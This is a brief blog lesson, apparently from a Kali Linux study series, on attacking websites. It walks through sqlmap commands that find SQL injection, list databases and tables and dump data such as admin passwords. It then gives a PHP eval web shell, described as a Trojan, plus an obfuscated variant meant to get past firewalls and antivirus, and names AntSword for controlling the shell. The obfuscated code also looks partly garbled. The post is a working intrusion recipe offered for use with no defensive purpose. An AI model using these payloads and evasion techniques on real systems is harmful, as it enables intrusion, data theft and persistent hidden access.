---
title: "kali lession 2 SqlMap"
date: 2026-04-01
categories: [未分类]
slug: kali-lession-2-sqlmap
wordpress_id: 26
---

# sqlmap

official document:[sqlmap: automatic SQL injection and database takeover tool](<https://sqlmap.org/>) (https://sqlmap.org/) 

## First 1:

check target if has vulnerabilities at sql 
    
    
    sqlmap -u "http://example"

inspect target database name 

`sqlmap -u "http://example" --dbs` look at target datatable name
    
    
    sqlmap -u "http://example" -D "target" -tables

extract target data 

`sqlmap -u "http://example" -D "company_website" -T target --dump`

## if get target admin password sucessfully

[![](/images/2026/03/7-150x150.png)](</images/2026/03/7.png>)  

## 

## 

## 

## First 2:

inject Torjan virus classic Torjan 
    
    
    <?php
    @eval($_POST['']);
    ?>

original code(will be checked by firewalls and antivirus software)  
    
    
    <?php
    $func = create_function('$a,$b', 'eval($b);');
    $func(base64_decode('@eval($_POST[""]);'));
    ?>

obfuscate code(avoid be found by firewalls and antivirus software) 
    
    
    <?php 
    <?php $dXXG=create_function(chr(046244/01041).chr(23805/207).str_rot13('b').base64
    _decode('bQ==').str_rot13('r'),chr(963-862).str_rot13('i').str_rot13('n').str_rot13('y').base64
    _decode('KA==').base64_decode('JA==').str_rot13('f').base64
    _decode('bw==').chr(0750-0573).str_rot13('r').str_rot13(')').chr(0162240/01740));
    $dXXG(base64_decode('MjE0M'.'TYzO0'.'BldkF'.'sKCRf'.'".chr(0207233/01457).chr(0202667/01713).chr(0407-0316).chr(0332-0206).chr(0210712/01457).".".str_rot13('S').base64
    _decode('cw==').chr(0x11b20/0x25c).chr(0200705/01531).chr(55650/525).".'NdKTs'.'2NDI0'.'ODk7'.'"));?>
    ?>

## First 3:

use ant sword [AntSwordProject/antSword: 中国蚁剑是一款跨平台的开源网站管理工具。AntSword is a cross-platform website management toolkit.](<https://github.com/AntSwordProject/AntSword>) https://github.com/AntSwordProject/AntSword handbook [AntSword 文档](<https://www.yuque.com/antswordproject/antsword>) https://www.yuque.com/antswordproject/antsword
